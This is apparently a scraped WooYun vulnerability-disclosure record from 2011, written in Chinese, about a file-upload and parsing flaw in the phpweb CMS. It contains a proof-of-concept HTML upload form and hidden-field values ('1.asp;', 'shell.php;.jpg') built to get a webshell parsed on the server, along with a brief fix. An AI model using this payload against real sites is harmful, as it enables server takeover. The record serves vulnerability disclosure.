{"id": 21934, "wybug_id": "wooyun-2011-03345", "wybug_title": "phpweb解析不当加上传漏洞", "wybug_corp": "phpweb", "wybug_author": "livers", "wybug_date": "2011-11-18 13:36", "wybug_open_date": "2011-11-19 02:41", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当导致攻击界面扩大", "任意文件上传", "解析文件漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-11-18：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2011-11-19：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 新版的phpweb 存在这上传和解析不当漏洞 详细说明：  \n<input type=\"hidden\" name=\"filepath\" value=\"Account/adminindex/1.asp;\"><input type=\"hidden\" name=\"filelx\" value=\"jpg\">\n可以解析图片马   漏洞证明：  exp  上传shell.php.jpg\n<form name=”uploadForm” style=”margin:0;padding:0;” method=”post” enctype=”multipart/form-data” action=”http://xxxxx.com/maq/upload.php”><input type=”hidden” name=”fileName” id=”fileName” value=”shell.php;.jpg” /><input type=”hidden” name=”attachPath” id=”fileName” value=”maq/pics/” /><input type=”file” name=”fileData” id=”imgFile” size=”14″ style=”border:1px solid #555555;”><input type=”submit” name=”button” id=”KE_IMAGEsubmitButton” value=”上传” style=”border:1px solid #555555;background-color:#AAAAAA;” /></form>\n   修复方案：  过滤，对上传类型进行限制，并随机重命名上传文件   版权声明：转载请注明来源 livers@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：5 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 5, "Ranks": null}